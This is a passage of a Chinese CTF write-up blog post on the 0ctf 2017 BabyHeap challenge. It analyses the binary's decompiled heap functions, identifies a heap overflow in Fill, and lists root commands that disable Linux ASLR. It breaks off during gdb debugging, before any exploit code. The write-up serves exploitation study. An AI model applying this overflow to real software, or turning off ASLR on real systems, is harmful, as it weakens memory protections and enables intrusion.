<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>0ctf_2017_BabyHeap | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>0ctf_2017_BabyHeap</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-13T07:26:29.000Z" id="date"> 2023-09-13</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-13T09:29:56.357Z" id="updated"> 2023-09-13</time></div></span><br><span>Word Count: <div class="control">6.3k</div></span><br><span>Read Time: <div class="control">29 min</div></span></div></div><hr><div id="post-content"><h1><strong>fastbin_attack中的Arbitrary Alloc（例题）</strong></h1>
<p>具体例子原理网上很多，这里就不再赘述了，这里讲解一道<strong>fastbin_attack中的Arbitrary Alloc</strong></p>
<blockquote>
<p>题目来源：0ctf 2017 BabyHeap<br>
参考资料：<br>
<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36495104/article/details/106202135">https://blog.csdn.net/qq_36495104/article/details/106202135</a> #思路<br>
CTF-wiki<br>
<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a> #payload<br>
<a target="_blank" rel="noopener" href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a> #关闭地址随机化</p>
</blockquote>
<blockquote>
<p>附件：<br>
链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw">https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw</a>  密码: f1i6<br>
–来自百度网盘超级会员V3的分享</p>
</blockquote>
<hr>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2>
<p>将文件下载下来，首先检查一下文件的保护情况：</p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png'><img src="https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png" alt="Snipaste_2023-09-13_15-31-15.png"></p>
<p>可以看到保护全部开启（这还玩个毛线啊）<br>
具体看一下各个保护：</p>
<blockquote>
<p>Arch:   amd64-64-little<br>
这个说明程序是64位程序，小端序<br>
RELRO:   Full RELRO<br>
Full RELRO开启，使整个 GOT 只读，从而无法被覆盖，进一步来说GOT表无法被修改<br>
Stack:   Canary found<br>
对使用随机数每个函数进行保护，防止栈溢出<br>
NX:    NX enabled<br>
不能向栈上直接注入shellcode<br>
PIE:    PIE enabled<br>
地址随机化，我感觉这个保护是最恶心的<br>
来看一下我的Linux环境：<br>
Ubuntu版本：16.04</p>
</blockquote>
<p>其中libc-2.23.so是我本机的libc文件</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2>
<p>整个程序相当于一个堆内存管理器，静态分析一下吧：</p>
<h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main-函数"></a>main 函数</h3>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>{<br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  addr = get_addr();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();                                     <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">//   puts("1. Allocate");</span><br>                                                <span class="hljs-comment">//   puts("2. Fill");</span><br>                                                <span class="hljs-comment">//   puts("3. Free");</span><br>                                                <span class="hljs-comment">//   puts("4. Dump");</span><br>                                                <span class="hljs-comment">//   puts("5. Exit");</span><br>                                                <span class="hljs-comment">//   printf("Command: ");</span><br>                                                <span class="hljs-comment">// </span><br>    input();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> __int64)off_14F4 )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1uLL</span>:<br>        Allocate((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2uLL</span>:<br>        Fill((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3uLL</span>:<br>        Free((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4uLL</span>:<br>        Dump((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5uLL</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>主函数内容，包含菜单函数和四个堆功能函数</p>
<h3 id="get-addr-函数-生成随机地址"><a href="#get-addr-函数-生成随机地址" class="headerlink" title="get-addr-函数-生成随机地址"></a>get_addr 函数(生成随机地址)</h3>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">get_addr</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  __int64 buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br><br>  buf[<span class="hljs-number">3</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  alarm(<span class="hljs-number">60u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"===== Baby Heap in 2017 ====="</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);                 <span class="hljs-comment">// 调用系统文件生成随机数</span><br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> || read(fd, buf, <span class="hljs-number">0x10</span>uLL) != <span class="hljs-number">16</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  close(fd);<br>  addr = (<span class="hljs-type">char</span> *)((buf[<span class="hljs-number">0</span>] % <span class="hljs-number">0x555555543000</span>uLL + <span class="hljs-number">0x10000</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>LL);<br>  v3 = (buf[<span class="hljs-number">1</span>] % <span class="hljs-number">0xE80</span>uLL) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL;<br>  <span class="hljs-keyword">if</span> ( mmap(addr, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>) != addr )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">return</span> &amp;addr[v3];                             <span class="hljs-comment">// 利用生成的随机数来生成随机地址</span><br>}<br></code></pre></td></tr></tbody></table></figure>
<p>​		这个函数可以使程序堆块信息存放在随机地址中，而不是固定的地址，因此我们很难通过找到存放堆块信息的地址来修改其地址从而控制程序的流程。<br>
​		还需要提一句的是，这个函数有alarm函数，从程序运行60秒之后就会终止进程，如果不想在调试程序的时候被打断，可以对二进制文件进行patch。patch之后的可执行文件名为：babyheap_0ctf_2017_patch</p>
<p>返回的addr 指针 包含了 所有chunk 的 信息和 数据chunk 的指针</p>
<h3 id="meau-函数"><a href="#meau-函数" class="headerlink" title="meau-函数"></a>meau 函数</h3>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. Allocate"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2. Fill"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3. Free"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4. Dump"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5. Exit"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Command: "</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>打印菜单</p>
<h3 id="Alloc-函数"><a href="#Alloc-函数" class="headerlink" title="Alloc-函数"></a>Alloc 函数</h3>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Allocate</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *calloc_ptr; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !*(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>      size = input();<br>      <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">4096</span> )<br>          size = <span class="hljs-number">4096</span>;<br>        calloc_ptr = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( !calloc_ptr )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        *(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) = <span class="hljs-number">1</span>;							<span class="hljs-comment">//chunk_flag</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">8</span>) = size;					<span class="hljs-comment">//chunk_size</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">16</span>) = calloc_ptr;			<span class="hljs-comment">//chunk_data_ptr 指向calloc出来的chunk_data</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Allocate Index %d\n"</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i);<br>      }<br>      <span class="hljs-keyword">return</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>传入的参数地址是get_addr 随机生成的地址。allocate函数是来创建堆块的，申请chunk最大的大小为4096。</p>
<p>首先输入堆块的content_size，然后调用calloc函数根据输入的content_size大小来创建堆块，最后堆块的信息保存在get_addr指针所指向的地址中。需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为\x00。<br>
请注意，堆块的index是从0开始的<br>
因此程序的结构体为：</p>
<blockquote>
<p>●chunk_flag:用来判断堆块是否存在<br>
●chunk_content_size:#记录content的大小<br>
●chunk_data_ptr:指向calloc出来的chunk_data</p>
</blockquote>
<h3 id="Fill-函数"><a href="#Fill-函数" class="headerlink" title="Fill-函数"></a>Fill 函数</h3>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Fill</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )	<span class="hljs-comment">//判断序号是否正确，判断flag为 chunk 是否存在</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>    v2 = input();					<span class="hljs-comment">//又让输出size，改写 chunk 数据部分的内容,存在溢出!!</span><br>    <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content: "</span>);<br>      read_func2(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), v2); 	<span class="hljs-comment">//*(_QWORD *)(24LL * v1 + a1 + 16) == chunk_data</span><br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>上图是Fill函数分伪代码，这个函数的功能比较有意思，漏洞也是存在这个函数中的。<br>
在填充内容的功能中，调用input函数来输入堆块的大小，并没有设置字符串结尾。而且比较有意思的是，这次又让我们重新输入了content_size，但是程序并没有将原来结构体中的content_size更改。且执行这个函数之后allocate chunk时堆块的size域没有改变，所以这里就出现了任意堆溢出的情形。</p>
<h3 id="Free-函数"><a href="#Free-函数" class="headerlink" title="Free-函数"></a>Free 函数</h3>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Free</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) = <span class="hljs-number">0</span>;<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>) = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>));<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>) = <span class="hljs-number">0LL</span>;     <span class="hljs-comment">// 指针置空</span><br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>输入序号，释放chunk。将 flag 字段，size 字段清0，free了数据chunk的指针同时也清0，不存在uaf</p>
<h3 id="Dump-函数"><a href="#Dump-函数" class="headerlink" title="Dump-函数"></a>Dump 函数</h3>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Dump</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Content: "</span>);<br>    write_func(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">puts</span>(byte_14F1);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>输入序号，打印内容</p>
<h2 id="gdb-动态调试"><a href="#gdb-动态调试" class="headerlink" title="gdb-动态调试"></a>gdb 动态调试</h2>
<p>还记得之前get_addr这个函数吗？这个函数主要使用来生成随机地址，其中指针也存放在哪里。</p>
<h3 id="关闭ASLR保护"><a href="#关闭ASLR保护" class="headerlink" title="关闭ASLR保护"></a>关闭ASLR保护</h3>
<p>由于这个程序开启了PIE保护，为了方便调试程序及查看堆内存，因此我们将Linux的ALSR(地址空间随机化)进行关闭。首先看一下ALSR开启的状态，可以使用下面的任意其中一种命令</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space<br><span class="hljs-number">2</span><br>ubuntu@ubuntu:~$ sysctl -a --pattern randomize<br>kernel.randomize_va_space = <span class="hljs-number">2</span><br>ubuntu@ubuntu:~$<br><br>###<br><span class="hljs-number">0</span> = 关闭<br><span class="hljs-number">1</span> = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（PIE也会影响heap的随机化）<br><span class="hljs-number">2</span> = 全随机。除了<span class="hljs-number">1</span>中所述，还有heap。<br>###<br></code></pre></td></tr></tbody></table></figure>
<p>现在关闭ASLR，关闭方法如下：<br>
<strong>方法一： 手动修改randomize_va_space文件</strong><br>
上面介绍的randomize_va_space文件的枚举值含义，设置的值不同，linux内核加载程序的地址空间的策略就会不同。比较简单明了。这里0代表关闭ASLR。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-number">0</span> &gt; /proc/sys/kernel/randomize_va_space<br>#注意，这里是先进root权限，后执行。<br>#重启之后会恢复默认<br></code></pre></td></tr></tbody></table></figure>
<p><strong>方法二： 使用sysctl控制ASLR</strong></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br>#重启之后将恢复默认<br>#如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。<br></code></pre></td></tr></tbody></table></figure>
<p><strong>方法三： 使用setarch控制单个程序的随机化</strong><br>
如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">setarch `uname -m` -R ./your_program<br>#-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)<br></code></pre></td></tr></tbody></table></figure>
<p><strong>方法四： 在GDB场景下，使用set disable-randomization off</strong><br>
在调试特定程序时，可以通过set disable-randomization命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。<br>
当然，这里开启，关闭和查看的方法看起来就比较正规了。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">关闭ASLR：<br><span class="hljs-built_in">set</span> disable-randomization on<br>开启ASLR：<br><span class="hljs-built_in">set</span> disable-randomization off<br>查看ASLR状态：<br>show disable-randomization<br></code></pre></td></tr></tbody></table></figure>
<p>我们如何找到那个随机地址呢？通过多次对程序gdb调试，发现了一直变化的地址（此时的ASLR已关闭，参见下文章下面的内容），下面的代码框之中是两次gdb调试的内存分布：</p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png'><img src="https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png" alt="Snipaste_2023-09-13_15-53-21.png"></p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png'><img src="https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png" alt="Snipaste_2023-09-13_15-54-08.png"></p>
<p>通过对比发现，变动的只有第一行的地址：</p>
<p>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>
0x40729d6e2000     0x40729d6e3000 rw-p     1000 0</p>
<p>​    0x2dd727226000     0x2dd727227000 rw-p     1000 0</p>
<p>到这里，可以猜测一下，程序的指针应该也存放在这片内存区域中。<br>
我们重新gdb调试，通过执行函数Allocate和fill，来看一下这片内存：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 